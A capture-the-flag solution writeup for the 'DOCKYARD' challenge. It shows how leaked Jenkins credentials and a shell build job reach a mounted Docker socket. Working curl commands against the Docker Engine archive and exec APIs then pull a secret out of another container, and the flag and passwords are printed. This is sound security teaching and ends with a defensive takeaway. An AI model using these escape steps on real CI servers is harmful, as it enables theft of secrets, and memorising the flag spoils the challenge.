# 🐳 DOCKYARD — Solution Writeup

## Overview

**Flag:** `nmctf{n3v3r_m0unt_d0ck3r_s0ck}`
**Author:** 4mdj4d (Algerian Devs)

The flag is stored inside an isolated container (`secure-vault`) at `/run/secrets/audit_token` running inside a nested sandboxed Docker-in-Docker (`dind`) daemon. 

Players must discover leaked Jenkins credentials on the starting `jumpbox`, log into the internal Jenkins instance, configure a custom Groovy Pipeline job, discover that the Docker socket is mounted in the build environment, and communicate with the raw Docker Engine HTTP API using `curl --unix-socket` to extract the flag.

---

## Step-by-Step Solution

### Step 1: Access the Jumpbox and Establish Tunnel
Spin up the challenge and connect to the player bastion jumpbox container via SSH while forwarding Jenkins port 8080:
```bash
docker compose up -d --build
ssh -L 8080:jenkins:8080 ctf@app.alpha.openscaler.net -p 9134
# Password: numidian123
```

The MOTD banner welcomes you to the **Algerian Devs** Internal Developer Workspace.

---

### Step 2: Information Disclosure
Explore the jumpbox filesystem. In the current folder (`/home/ctf`), you will find the developer notes left behind by developer **4mdj4d**:
```bash
cat /home/ctf/developer_notes.txt
```

**Output:**
```text
Hey Karim,
Vault container is live. Secret's loaded via Docker secrets as discussed. Jenkins is great !
, I removed the docker binary from it  so interns can't mess with production containers again (remember last Thursday? lol)
Creds are still the temp ones: admin / 4mdj4d_dz_sec_2026
I'll rotate them after the audit. Don't remind me.
```

**Key Discovery:**
* Jenkins service is running internally.
* Jenkins credentials: `admin` / `4mdj4d_dz_sec_2026`.
* The developer note says they **removed the docker binary** to prevent interns from messing with production containers, but confirms they are running a **Vault container** with a secret loaded via **Docker secrets**.

---

### Step 3: Access Jenkins
1. Open your web browser on your host machine and navigate to the exposed Jenkins portal:
   `http://localhost:8080`
2. Log in using the credentials discovered in the notes:
   * **Username:** `admin`
   * **Password:** `4mdj4d_dz_sec_2026`

---

### Step 4: Environment Reconnaissance and Forensic Inspection
1. Upon logging into the Jenkins dashboard, you will see a pre-existing build job named **deploy-vault**.
2. Click on **deploy-vault** and inspect the console log of **Build #1** in its history:
   ```text
   Started by user admin
   Running as SYSTEM

   + docker run -d --name secure-vault --secret audit_token alpine:3.19 tail -f /dev/null
   a3f8c9e2b1d4

   Finished: SUCCESS
   ```
   **Key Discoveries:**
   * The production container is named `secure-vault`.
   * It mounts a Docker secret named `audit_token` (which by default resides inside the container at `/run/secrets/audit_token`).
   * It keeps running in the background with `tail -f /dev/null`.

3. Now, let's create a custom build job to probe the build environment. Click **New Item** on the left sidebar.
4. Enter the name `audit-exploit`, select **Freestyle project**, and click **OK**.
5. Scroll down to the **Build Steps** section.
6. Click **Add build step** and select **Execute shell**.
7. In the Command text area, enter the following basic recon commands:
   ```bash
   whoami
   ls -la /var/run/
   ```
8. Click **Save** and select **Build Now** on the left menu.
9. Under **Build History**, click the build number (e.g., `#1`) -> **Console Output**. You will observe:
   * The job runs as `root`.
   * The file `/var/run/docker.sock` is present and writable!
   * The `docker` CLI tool is **not** installed on the runner (typing `docker` returns command not found).

---

### Step 5: Talking to the Raw Docker Socket API
Since the Docker socket is a Unix domain socket, we don't need a Docker client binary to talk to it. We can interact with it directly using `curl` and the **Docker Engine API** specification.

1. Go back to the job page, click **Configure** on the left menu.
2. Scroll to the **Execute shell** build step, and update the command to query the active container list:
   ```bash
   curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json?all=true | jq .
   ```
3. Click **Save** and click **Build Now**.
4. Inspect the **Console Output** of build `#2`. The JSON response lists all running nested containers:
   ```json
   [
     {
       "Id": "1b08f407b8fa3d98fb...",
       "Names": ["/secure-vault"],
       "Image": "alpine:3.19",
       "State": "running",
       "Status": "Up 2 minutes"
     }
   ]
   ```

---

### Step 6: Flag Extraction (Container Breakout)
The target container is `secure-vault`. In the developer notes, they stated it holds the "secret flag".

The Docker Engine API offers a `GET /containers/{id}/archive` endpoint that downloads a tar archive of any file or folder from a container's filesystem.

1. Click **Configure** on the left menu.
2. Update the **Execute shell** build step command to download the flag file and extract it on the fly using `tar -xO` (extract to standard output):
   ```bash
    curl -s --unix-socket /var/run/docker.sock \
      "http://localhost/containers/secure-vault/archive?path=/run/secrets/audit_token" | tar -xO
   ```
3. Click **Save** and click **Build Now**.
4. Check the **Console Output** of build `#3`. It prints the flag:

   ```text
   nmctf{n3v3r_m0unt_d0ck3r_s0ck}
   ```

---

## Alternative Solve Path (Docker Exec API)

Instead of using the Archive API, players can also use the **Exec API** to spawn a command inside the target container.

1. **Create Exec Instance:**
   ```bash
    EXEC_ID=$(curl -s -X POST --unix-socket /var/run/docker.sock \
      -H "Content-Type: application/json" \
      -d '{"AttachStdout": true, "Cmd": ["cat", "/run/secrets/audit_token"]}' \
      http://localhost/containers/secure-vault/exec | jq -r .Id)
   ```
2. **Start Exec Instance:**
   ```bash
   curl -s -X POST --unix-socket /var/run/docker.sock \
     -H "Content-Type: application/json" \
     -d '{"Detach": false, "Tty": false}' \
     http://localhost/exec/$EXEC_ID/start
   ```

---

## Security Takeaway
Exposing `/var/run/docker.sock` to a container grants that container full root access to the Docker engine. Even in a sandboxed Docker-in-Docker environment like this one, it allows full escape from the runner container into the nested host container. In production environments, never mount the Docker socket unless absolutely necessary, and always restrict container capabilities and user namespaces.
